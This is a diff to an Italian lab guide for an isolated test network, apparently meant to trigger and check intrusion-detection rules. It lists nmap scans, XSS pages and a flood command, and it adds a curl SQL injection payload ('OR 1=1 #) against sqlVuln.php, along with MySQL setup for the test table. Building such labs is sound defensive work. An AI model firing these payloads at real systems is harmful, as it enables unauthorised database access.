@@ -51,7 +51,6 @@ identificare e magari reagire ad una serie di tipologie di attacco quali
 
 nmap -sS 172.18.0.3  ,   nmap -sV 172.18.0.3
 
-
 2) XSS sfruttando la pagina http://172.18.0.3/xssVuln.php o 
 http://172.18.0.3/xssVulnCookie.php. Per farlo da shell possiamo usare 
 il comando curl come segue
@@ -66,7 +65,29 @@ dove -c in particolare specifica il numero di iterazioni dopo il
 quale fermarsi, il rate è il numero di pacchetti inviati al secondo, e 
 ovviamente sono specificati IP destinazione, porta e tipo di connessione.
 
+4) Attacco SQL Injection sfruttando la vulnerabilità della pagina sqlVuln.php
+dove è presente un form da compilare per poter accedere ad un database.
+Si può eseguire l'attacco da shell con il comando curl:
 
+curl http://172.18.0.3/sqlVuln.php?user_id=1'OR+1%3D1+%23
+
+Ovviamente prima dell'esecuzione dell'attacco va innanzitutto creata 
+e riempita la tabella del database MySql:
+
+-- Per fare il login in MySQL
+mysql -u user -p   
+
+-- Per selezionare il database nel DBServer
+USE testdb;        
+
+-- Per creare una table nel DB
+CREATE TABLE utenti (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    nome VARCHAR(100) NOT NULL
+);                 
+
+-- Per inserire un valore nella tabella
+INSERT INTO utenti (nome) VALUES ('Kvaratskhelia'); 
 
 
 Per controllare che i log siano quelli delle regole che vogliamo 
